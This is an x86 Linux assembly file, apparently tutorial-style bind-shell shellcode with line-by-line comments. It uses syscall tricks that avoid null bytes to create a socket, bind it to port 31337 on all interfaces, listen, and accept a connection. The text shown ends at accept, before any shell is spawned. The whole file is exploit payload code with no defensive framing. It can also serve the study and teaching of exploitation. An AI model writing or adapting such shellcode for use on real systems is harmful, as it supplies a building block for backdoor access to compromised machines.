BITS 32 ;

; s = socket( 2, 1, 0)
push BYTE 0x66      ; socketcall = #102 = 0x66
pop  eax            ; put 102 in EAX
cdq                 ; zero out EDX
xor  ebx,ebx        ; zero out EBX
inc  ebx            ; EBX = 1 SYS_SOCKET = socket()
push edx            ; build arg array = { protocol    = 0
push BYTE 0x1       ; (in reverse)        SOCK_STREAM = 1
push BYTE 0x2       ;                     AF_INET     = 2 }
mov  ecx,esp        ; ecx = ptr to argv[]
int  0x80           ; syscall , after this EAX has 'sockfd'

mov  esi,eax        ; save sockfd in ESI for later use

; bind( s, [2,31337,0], 16)
push BYTE 0x66      ; socketcall = #102 - 0x66
pop  eax            ; put 102 in EAX
inc  ebx            ; EBX = 2 = SYS_BIND = bind()
push edx            ; build sockaddr struct:{ INADDR_ANY = 0
push WORD 0x697a    ;                         PORT       = 31337
push WORD bx        ;                         AF_INET    = 2 }
mov  ecx,esp        ; ECX is ptr to struct
push BYTE 16        ; argv : { sizeof(struct) = 16
push ecx            ;          struct pointer
push esi            ;          sockfd }
mov  ecx,esp        ; ECX = argv[]
int  0x80           ; Syscall , EAX = 0 on success

; listen( s, 4)
mov  BYTE al,0x66   ; socketcall #102
inc  ebx            ; EBX = 3
inc  ebx            ; EBX = 4 SYS_LISTEN = listen()
push ebx            ; argv { backlog = 4
push esi            ;        sockfd }
mov  ecx,esp        ; ECX is ptr to argv[]
int  0x80           ; syscall

; accept( s, 0, 0)
mov  BYTE al,0x66   ; socketcall #102
inc  ebx            ; EBX = 5 SYS_ACCEPT = accept()
push edx            ; argv { socklen      = 0
push edx            ;        sockaddr ptr = NULL
push esi            ;        sockfd }
mov  ecx,esp        ; ecx = argv[]
int  0x80           ; eax = connected sockfd